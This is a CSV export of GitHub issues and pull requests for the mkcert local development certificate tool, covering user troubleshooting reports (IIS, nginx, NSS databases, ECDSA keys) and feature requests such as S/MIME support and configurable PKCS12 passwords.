FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/148,420321425,MDU6SXNzdWU0MjAzMjE0MjU=,148,IIS complains about missing intermediates,4738140,open,FALSE,NA,NA,11,2019-03-13T05:17:50Z,2019-08-17T18:17:29Z,NA,NONE,NA,"Hi,

- Windows 10 1809 Professional
- IIS 10.0.17763.1
- Have run mkcert -install

Generated my new wildcard certificate as:

```
 mkcert -pkcs12 ""*.ozc.black""
```

I then go to IIS > Server Certificates and try and import it but am prompted for a password? 

![image](https://user-images.githubusercontent.com/4738140/54255278-85eaea00-45ab-11e9-944f-55b2f0108114.png)

What am I missing here? It is not my login password.
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/148/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/148/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/148/events,https://github.com/FiloSottile/mkcert/issues/148,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/147,420119675,MDU6SXNzdWU0MjAxMTk2NzU=,147,Warning: the local CA is not installed in the system trust store! ⚠️,6465532,closed,FALSE,NA,NA,13,2019-03-12T17:39:38Z,2019-03-12T23:11:41Z,2019-03-12T23:11:41Z,NONE,NA,"I just installed `mkcert` as a recommendation for certificates for all my `nginx` `vhosts`.  

    brew install mkcert
    mkcert -install

Then I tried some domains...

    mkcert pass1.local pass2.local pass3.local

That error came up:

    Warning: the local CA is not installed in the system trust store! ⚠️

Am I doing this right or is this an oversight?  

	[Tue Mar 12 13:35 rich@HQ ~/Library/Application Support/mkcert] ll
	total 48
	drwxr-xr-x    8 rich  staff   272B Mar 12 13:35 .
	drwx------@ 224 rich  staff   7.4K Mar 12 13:19 ..
	-rw-------    1 rich  staff   1.7K Mar 12 13:35 pass.local+5-key.pem
	-rw-r--r--    1 rich  staff   1.5K Mar 12 13:35 pass.local+5.pem
	-r--------    1 rich  staff   2.4K Mar 12 13:19 rootCA-key.pem
	-rw-r--r--    1 rich  staff   1.6K Mar 12 13:19 rootCA.pem",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/147/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/147/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/147/events,https://github.com/FiloSottile/mkcert/issues/147,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/146,417821458,MDU6SXNzdWU0MTc4MjE0NTg=,146,EV SSL,23612126,closed,FALSE,NA,NA,1,2019-03-06T14:08:21Z,2019-06-01T12:55:19Z,2019-06-01T12:55:19Z,NONE,NA,"how can I get SSL like this,a EV-SSL!
![image](https://user-images.githubusercontent.com/23612126/53887000-475da880-405c-11e9-8beb-f1fe03eec01e.png)
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/146/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/146/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/146/events,https://github.com/FiloSottile/mkcert/issues/146,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/145,415981850,MDU6SXNzdWU0MTU5ODE4NTA=,145,Help me !How Can I install in nginx on Win,12774598,closed,FALSE,NA,NA,5,2019-03-01T07:50:28Z,2019-03-04T03:17:19Z,2019-03-04T03:17:19Z,NONE,NA,"OS:WIN7 
```
$  mkcert -install
Using the local CA at ""C:\Users\chj\AppData\Local\mkcert"" ✨
The local CA is now installed in the system trust store! ⚡️
Note: Firefox support is not available on your platform. ℹ️

$  mkcert www.demo.com
Using the local CA at ""C:\Users\chj\AppData\Local\mkcert"" ✨

Created a new certificate valid for the following names 📜
 - ""www.demo.com""

The certificate is at ""./www.demo.com.pem"" and the key at ""./www.demo.com-key.pem"" ✅

```
here is my nginx vhost conf:
```
server {
        listen       443 ssl http2;
        server_name  www.demo.com  ;
        location / {
            root   D:/wwwroot/www.demo.com;
            index  index.html  index.php default.php;
           # include        D:/wwwroot/www.demo.com/up-*.conf;
        }
        autoindex off;
        include advanced_settings.conf;
            ssl on;
            ssl_certificate   www.demo.com.pem;
            ssl_certificate_key www.demo.com.pem-key.pem;
        #include expires.conf;
        location ~* .*\/(attachment|attachments|uploadfiles|avatar)\/.*\.(php|PHP7|phps|asp|aspx|jsp)$ {
        deny all;
        }
        location ~ ^.+\.php {
            root           D:/wwwroot/www.demo.com;
            fastcgi_pass   bakend;
            fastcgi_index  index.php;
            fastcgi_split_path_info ^((?U).+\.php)(/?.+)$;
            fastcgi_param  PATH_INFO $fastcgi_path_info;
            fastcgi_param  PATH_TRANSLATED $document_root$fastcgi_path_info;
            include        fastcgi.conf;
        }
    }
```
 And I'm sure the certificate files path is correct
here is my hosts:
```
127.0.0.1	www.demo.com
```
But, it cant run",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/145/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/145/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/145/events,https://github.com/FiloSottile/mkcert/issues/145,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/144,415802281,MDU6SXNzdWU0MTU4MDIyODE=,144,Create certificate with multiple Subject Alternative Names,836140,closed,FALSE,NA,NA,2,2019-02-28T20:10:36Z,2019-02-28T21:11:10Z,2019-02-28T21:06:48Z,NONE,NA,"Hi,

Would it be possible to create a certificate with multiple Subject Alternative Name entries? The use case here is to be able to use a single cert for multiple domains rather than a cert per domain.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/144/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/144/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/144/events,https://github.com/FiloSottile/mkcert/issues/144,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/143,415759104,MDU6SXNzdWU0MTU3NTkxMDQ=,143,Support s/mime email certificates,518542,closed,FALSE,NA,NA,6,2019-02-28T18:19:59Z,2019-04-12T02:59:44Z,2019-04-12T02:59:44Z,NONE,NA,"Given an email address for a command line option, it would be cool to generate certificates suitable for S/MIME use in Thunderbird or Outlook.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/143/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/143/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/143/events,https://github.com/FiloSottile/mkcert/issues/143,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/142,414209943,MDExOlB1bGxSZXF1ZXN0MjU1OTcyMjY2,142,Change u.Username to u.Name for more readibility,88981,closed,FALSE,NA,NA,5,2019-02-25T17:07:19Z,2019-06-02T11:58:56Z,2019-06-02T11:57:37Z,NONE,NA,Use the `u.User` might be better than just use `u.Username`.  It because the `userAndHostname` used in **CommonName** and **OrganizationalUnit** field of the certificate.,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/142/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/142/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/142/events,https://github.com/FiloSottile/mkcert/pull/142,https://api.github.com/repos/FiloSottile/mkcert/pulls/142
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/141,414208555,MDExOlB1bGxSZXF1ZXN0MjU1OTcxMTcw,141,Rename file extension for more cross-platforms friendly.,88981,closed,FALSE,NA,NA,1,2019-02-25T17:04:18Z,2019-02-25T18:06:03Z,2019-02-25T18:06:03Z,NONE,NA,"The `*.crt` file extension are associated with Crypto Shell Extensions in Windows. So leave the extension to `*.crt` might be better for cross platform friendly.

Changes:

- `*-key.pem` --> `*.key`
- `*.pem` --> `*.crt`

",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/141/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/141/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/141/events,https://github.com/FiloSottile/mkcert/pull/141,https://api.github.com/repos/FiloSottile/mkcert/pulls/141
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/140,413570695,MDU6SXNzdWU0MTM1NzA2OTU=,140,Allow setting pfx password,664956,closed,FALSE,NA,NA,2,2019-02-22T20:41:42Z,2019-02-22T22:55:40Z,2019-02-22T22:55:40Z,NONE,NA,"Right now the pfx password is ""changeit"" (thanks #86 for showing it). This is ok, but I must break out openssl to change it.  Can we add a parameter so I can pass in this password so I get the cert I want in one shot?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/140/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/140/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/140/events,https://github.com/FiloSottile/mkcert/issues/140,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/139,411793595,MDExOlB1bGxSZXF1ZXN0MjU0MTUxNjE5,139,Add Chinese translation of README.md,8823477,open,FALSE,NA,NA,0,2019-02-19T08:04:33Z,2019-09-10T13:47:35Z,NA,NONE,NA,"Add Chinese translation of README.md，In order to facilitate most developers in China, I hope that you can accept this request.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/139/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/139/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/139/events,https://github.com/FiloSottile/mkcert/pull/139,https://api.github.com/repos/FiloSottile/mkcert/pulls/139
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/138,410878389,MDU6SXNzdWU0MTA4NzgzODk=,138,"New certificate ""appears to be expired""",2541728,closed,FALSE,NA,NA,3,2019-02-15T17:51:33Z,2019-11-09T03:31:14Z,2019-02-15T18:56:57Z,NONE,NA,"I just created a new certificate for a project on my local machine. But when I load up the site, I get the following error:

""Websites prove their identity via certificates, which are valid for a set time period. The certificate for local.test appears to be expired.""

Examining the certificate, it says creation date is June 29, 2017 and the expiration date is June 29, 2018.

Very odd and confusing. What's happening here?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/138/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/138/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/138/events,https://github.com/FiloSottile/mkcert/issues/138,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/137,410867206,MDExOlB1bGxSZXF1ZXN0MjUzNTAzNTYx,137,"Swap exec.Command(""hostname"") for os.Hostname()",161319,closed,FALSE,NA,NA,0,2019-02-15T17:19:37Z,2019-02-15T20:11:46Z,2019-02-15T20:11:46Z,CONTRIBUTOR,NA,I happened to do exactly this two days ago: https://twitter.com/davidcrawshaw/status/1095727243052105729,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/137/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/137/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/137/events,https://github.com/FiloSottile/mkcert/pull/137,https://api.github.com/repos/FiloSottile/mkcert/pulls/137
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/136,410864354,MDU6SXNzdWU0MTA4NjQzNTQ=,136,mkcert has no tests,161319,open,FALSE,NA,NA,6,2019-02-15T17:11:31Z,2019-08-21T00:10:15Z,NA,CONTRIBUTOR,NA,"```
$ go test ./...
?   	github.com/FiloSottile/mkcert	[no test files]
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/136/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/136/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/136/events,https://github.com/FiloSottile/mkcert/issues/136,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/135,410827117,MDU6SXNzdWU0MTA4MjcxMTc=,135,mkcert is slow on darwin (due to nss support),161319,closed,FALSE,NA,NA,1,2019-02-15T15:45:06Z,2019-08-16T22:24:17Z,2019-08-16T22:24:17Z,CONTRIBUTOR,NA,"On a MacBook Air 2018:

```
$ time (./mkcert -help &> /dev/null)

real	0m1.010s
user	0m0.657s
sys	0m0.309s
```

This is caused by the `init` function in truststore_nss.go, which invokes the brew command. If I comment out the init function:

```
$ time (./mkcert -help &> /dev/null)

real	0m0.025s
user	0m0.013s
sys	0m0.010s
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/135/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/135/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/135/events,https://github.com/FiloSottile/mkcert/issues/135,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/134,409552985,MDU6SXNzdWU0MDk1NTI5ODU=,134,SEC_ERROR_LEGACY_DATABASE,1326910,closed,FALSE,NA,NA,4,2019-02-12T23:40:30Z,2019-02-20T02:51:16Z,2019-02-20T02:51:16Z,NONE,NA,"Using the latest binary I'm getting the following error in ubuntu 16.10

```
./mkcert -install
Using the local CA at ""/home/tim/.local/share/mkcert"" ✨
ERROR: failed to execute ""certutil -A"": exit status 255

certutil: function failed: SEC_ERROR_LEGACY_DATABASE: The certificate/key database is in an old, unsupported format.
```

There are a couple issue that reference this, but they are both closed #12  so not sure if this is a regression ? ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/134/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/134/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/134/events,https://github.com/FiloSottile/mkcert/issues/134,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/133,408445846,MDU6SXNzdWU0MDg0NDU4NDY=,133,Add support for extended key usage extension ,44198148,closed,FALSE,NA,NA,1,2019-02-09T16:25:18Z,2019-02-15T00:02:10Z,2019-02-15T00:02:10Z,NONE,NA,It would be useful if you could use mkcert to create certificates with the extended key usage extension. That extension is necessary if you want to use a software like [PyKMIP](https://github.com/OpenKMIP/PyKMIP/wiki/Certificates).,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/133/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/133/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/133/events,https://github.com/FiloSottile/mkcert/issues/133,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/132,407749995,MDU6SXNzdWU0MDc3NDk5OTU=,132,add an option to specify pkcs12 file password,31178673,closed,FALSE,NA,NA,2,2019-02-07T15:17:01Z,2019-02-08T02:48:00Z,2019-02-08T02:48:00Z,NONE,NA,The password of pkcs12 file is currently hard coded into source. I want to generate a pkcs12 file for program that only support blank password.,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/132/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/132/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/132/events,https://github.com/FiloSottile/mkcert/issues/132,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/131,407141618,MDU6SXNzdWU0MDcxNDE2MTg=,131,Support for Name Constraints?,75156,closed,FALSE,NA,NA,2,2019-02-06T09:18:32Z,2019-02-13T10:53:04Z,2019-02-08T02:51:34Z,NONE,NA,"Hi!

I was wondering if there is any support for the [Name Constraint](https://tools.ietf.org/html/rfc5280#section-4.2.1.10) extension? I admit I only took a quick look but wasn't able to find anything in regard to this in `mkcert`.

Background: I would like to constraint the authority of the CA certificate generated by mkcert to be restricted to `*.lab.tisba.de` or `*.lab.localhost` etc. There seems to be a growing support for this extension (Chrome does support it for some time, OpenSSL as well and I think it should also be supported by Edge/IE and Safari, maybe even more platforms).

If the private RSA key for the generated root CA could be password protected, combined with name constraints could greatly help to protect from misuse.

If this all makes sense, and you would accept a PR on that topic, I'd be happy to give this a try.

Thank you for mkcert! 💕 ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/131/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/131/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/131/events,https://github.com/FiloSottile/mkcert/issues/131,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/130,406954533,MDU6SXNzdWU0MDY5NTQ1MzM=,130,Secure connection failed,221853,closed,FALSE,NA,NA,3,2019-02-05T20:11:11Z,2019-02-05T20:45:24Z,2019-02-05T20:45:24Z,NONE,NA,"I tried using `mkcert` with these steps

- Install mkcert CA and certificates
``` bash
mkcert -install 
mkcert ""*.site.localhost"" site.localhost localhost 127.0.0.1 ::1
```
- open Firefox and go to https://localhost

But then I got the error 

> Secure Connection Failed
> An error occurred during a connection to localhost:8080. SSL received a record that exceeded the maximum permissible length. Error code: SSL_ERROR_RX_RECORD_TOO_LONG
>   The page you are trying to view cannot be shown because the authenticity of the received data could not be verified.
>   Please contact the web site owners to inform them of this problem.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/130/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/130/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/130/events,https://github.com/FiloSottile/mkcert/issues/130,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/129,406877586,MDU6SXNzdWU0MDY4Nzc1ODY=,129,mkcert ruined my localhost:8080,19172250,closed,FALSE,NA,NA,12,2019-02-05T16:53:01Z,2020-11-26T15:50:47Z,2019-02-08T02:54:30Z,NONE,NA,"I had to run [these commands](https://shopify.github.io/slate/docs/create-a-self-signed-ssl-certificate) in order to get [slate](https://shopify.github.io/slate/docs/create-a-self-signed-ssl-certificate) to work, it never worked... Then I found some hacks in the github issues of slate, it finally worked by creating some keys in my project.

Now when I run webpack-dev-server on my own personal projects using my [boilerplate](https://github.com/tr1s/tris-webpack-boilerplate), localhost:8080 doesn't work anymore, none of them do. I tried doing mkcert install and mkcert localhost and it created my keys, but still nothing.. I get this below.

<img width=""1680"" alt=""cleanshot 2019-02-05 at 11 51 43 2x"" src=""https://user-images.githubusercontent.com/19172250/52289637-6cb3a580-293c-11e9-8048-a67e24b68d49.png"">

How do I get things back to normal? I don't want all these extra steps just to run my personal projects. All I had to do before was type ""npm start"" and everything was ready to go. Ever since me setting up _one_ slate project everything else is ruined so far.

Any ideas? How can I fix this? ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/129/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/129/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/129/events,https://github.com/FiloSottile/mkcert/issues/129,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/128,406425507,MDU6SXNzdWU0MDY0MjU1MDc=,128,Not able to export on Android 9 ,26567771,closed,FALSE,NA,NA,2,2019-02-04T17:00:21Z,2019-02-14T16:06:44Z,2019-02-14T16:06:44Z,NONE,NA,"Hi, i'm not able to export a cert on my Android mobile.
I exported a cert yesterday and it worked, now i'm trying to export another certificate and it doesn't work.
Any advice? ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/128/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/128/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/128/events,https://github.com/FiloSottile/mkcert/issues/128,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/127,406261237,MDU6SXNzdWU0MDYyNjEyMzc=,127,ecdsa key support doesn't seem to be compatible with golang 1.11.5 x509 libs,18923,closed,FALSE,NA,NA,2,2019-02-04T10:20:32Z,2019-02-05T19:01:26Z,2019-02-05T19:01:26Z,NONE,NA,"I have the following code in a go program:

```go
func (c *Cert) readKey(filename string) error {
  content, err := ioutil.ReadFile(filename)
  if err != nil {
    return err
  }

  block, _ := pem.Decode(content)

  c.privkey, err = x509.ParseECPrivateKey(block.Bytes) // this is where it's breaking
  if err != nil {
    return err
  }

  c.pubkey = *c.privkey.Public().(*ecdsa.PublicKey)

  return nil
}
```

mkcert commandline:

```bash
mkcert --install
mkcert --ecdsa --cert-file /tmp/localhost-server.pem --key-file /tmp/localhost-server.key localhost 127.0.0.1 ::1
```

Error message from the above code:

```
/tmp/localhost-server.key: x509: failed to parse EC private key: asn1: structure error: tags don't match (4 vs {class:0 tag:16 length:19 isCompound:true}) {optional:false explicit:false application:false private:false defaultValue:<nil> tag:<nil> stringType:0 timeType:0 set:false omitEmpty:false}  @5
```

I'm not a crypto guy but that code works with golang's generate_cert and even has a test suite designed around that tool. This code typically works with other keys; just not sure what this means and how I can fix it.

Maybe it's me and I'm sorry if I wasted your time, but figured it was worth trying anyway to see if it was the tool. I really like it so far! Desperately needed. Please keep it up.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/127/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/127/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/127/events,https://github.com/FiloSottile/mkcert/issues/127,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/126,406247417,MDU6SXNzdWU0MDYyNDc0MTc=,126,client support names files the same as the server certs,18923,closed,FALSE,NA,NA,3,2019-02-04T09:41:47Z,2019-02-05T21:31:36Z,2019-02-05T19:20:08Z,NONE,NA,Not sure if this is something you want to address or not; I was able to trivially workaround with the naming flags.,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/126/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/126/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/126/events,https://github.com/FiloSottile/mkcert/issues/126,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/125,405768183,MDU6SXNzdWU0MDU3NjgxODM=,125,Generate  CA + client certificate pair for client authentication purposes,1253376,closed,FALSE,NA,NA,1,2019-02-01T16:11:45Z,2019-02-02T21:29:28Z,2019-02-02T21:27:04Z,NONE,NA,"This is related to #89, but goes a bit more into the detail about how generating client certificates could be useful:

What I recently started experimenting with, is using client certificate authentication as a sort of SSH's authorized_keys, but for the web.  Often you can configure on a web server a list of CAs that are accepted for client authentication. This is the case for example with nginx's ssl_verify_client /ssl_client_cert...

The idea would be to:

- Generate a new self-signed CA (with key and certificate)
- Generate a new client certificate, signed by the above CA (also key + cert)
- Delete the CA key. Now you have:
  - CA certificate -> this is your public key
  - client certificate (key+cert) -> this is your private key
- Load the client certificate in the browser (best is to use the PKCS12 format with a password)
- Put your personal, self-signed CA in the list of accepted certificates on the web server.

I was wondering on writing also a tool / script to facilitate this, but it would be awesome to have this functionality in mkcert! Maybe something like:

    mkcert -client-adhoc -name ""Firstname Lastname"" mycert
    # generates:
    # - mycert.ca.pem  -> CA certificate, put this in your server config
    # - mycert.pkcs12   -> client certificate to load in the browser

I have to say: I wonder a bit why nobody seems to be doing this (using client certificate like ssh's authorized_keys)... Maybe it's a bad idea? It seems like a very practical thing, especially for testing.

Let me know your thoughts... Maybe I could try implementing this.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/125/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/125/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/125/events,https://github.com/FiloSottile/mkcert/issues/125,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/124,402791716,MDExOlB1bGxSZXF1ZXN0MjQ3Mzk1NTEx,124,Add installation script gets latest mkcert release,761285,closed,FALSE,NA,NA,2,2019-01-24T16:32:28Z,2019-02-03T09:25:23Z,2019-02-02T21:26:17Z,NONE,NA,"```text
./get.sh --help
Installation script gets latest mkcert release for platform and makes runnable binary

Run options:

    -d, --debug                  debug and trace mode
    -n, --no-verify-signature    skip verify signature
    -i, --install-dir=""pwd""      accepts a target installation directory
    -h, --help                   display this help and exit
```

By default verify gpg signature.

info: about gpg https://rvm.io/rvm/security

TODO

- [ ] make public GPG key `mkcert.asc`.
- [ ] add sing file of pre-built binaries `%binFile%.sig` to reliase page.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/124/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/124/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/124/events,https://github.com/FiloSottile/mkcert/pull/124,https://api.github.com/repos/FiloSottile/mkcert/pulls/124
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/123,401292408,MDU6SXNzdWU0MDEyOTI0MDg=,123,Change the location of the CA files,625286,closed,FALSE,NA,NA,11,2019-01-21T10:42:04Z,2019-01-22T06:26:56Z,2019-01-22T06:26:56Z,NONE,NA,"Sorry for the perhaps stupid question, but how can I change the location for the generated certificates? How do I use the variable $CAROOT when generating? An example would be great. For example, what should I do if I want to store the certificates in a folder under ~/local_certificates?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/123/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/123/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/123/events,https://github.com/FiloSottile/mkcert/issues/123,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/122,401016961,MDU6SXNzdWU0MDEwMTY5NjE=,122,Password for Root CA key,502942,closed,FALSE,NA,NA,6,2019-01-19T17:35:04Z,2019-01-26T09:40:32Z,2019-01-26T09:16:57Z,NONE,NA,Is it possible to protect the Root CA key with a password?,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/122/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/122/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/122/events,https://github.com/FiloSottile/mkcert/issues/122,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/121,400053825,MDExOlB1bGxSZXF1ZXN0MjQ1MzM0Mzgz,121,nss: look in more locations for cert/key database,120951,closed,FALSE,NA,NA,3,2019-01-17T00:07:54Z,2019-06-01T15:28:11Z,2019-06-01T15:28:11Z,CONTRIBUTOR,NA,"There seem to be installs/platforms that don't follow the typical NSS database install location. I don't know how many of these we want to support, so `NSSDB=<path> mkcert -install` could be an option also.

Issue: https://github.com/FiloSottile/mkcert/issues/116 and https://github.com/FiloSottile/mkcert/issues/120",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/121/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/121/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/121/events,https://github.com/FiloSottile/mkcert/pull/121,https://api.github.com/repos/FiloSottile/mkcert/pulls/121
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/120,400003392,MDU6SXNzdWU0MDAwMDMzOTI=,120,ERROR: no Firefox and/or Chrome/Chromium security databases found,15215220,closed,FALSE,NA,NA,10,2019-01-16T21:21:50Z,2019-12-04T05:14:01Z,2019-06-01T15:28:11Z,NONE,NA,"Hey. I installed mkcert via rpm -Uvh harbottle-main-release*rpm
yum install mkcert
On my centos 7.

When i try to use ""mkcert -install"" it gives me the following error
""Using the local CA at ""/root/.local/share/mkcert"" ✨
ERROR: no Firefox and/or Chrome/Chromium security databases found
""


Any idea how to fix this? ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/120/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/120/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/120/events,https://github.com/FiloSottile/mkcert/issues/120,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/119,398535605,MDU6SXNzdWUzOTg1MzU2MDU=,119,Install to nginx,19504461,closed,FALSE,NA,NA,1,2019-01-12T08:51:47Z,2019-01-12T23:13:51Z,2019-01-12T23:13:51Z,NONE,NA,Maybe add a new command to install certs to nginx and set it up,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/119/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/119/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/119/events,https://github.com/FiloSottile/mkcert/issues/119,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/118,398534512,MDU6SXNzdWUzOTg1MzQ1MTI=,118,ECDSA certificate support,35003541,closed,FALSE,NA,NA,1,2019-01-12T08:39:19Z,2019-02-02T21:30:09Z,2019-02-02T21:27:04Z,NONE,NA,"It would be great to have the ability to generate ECDSA certificate.

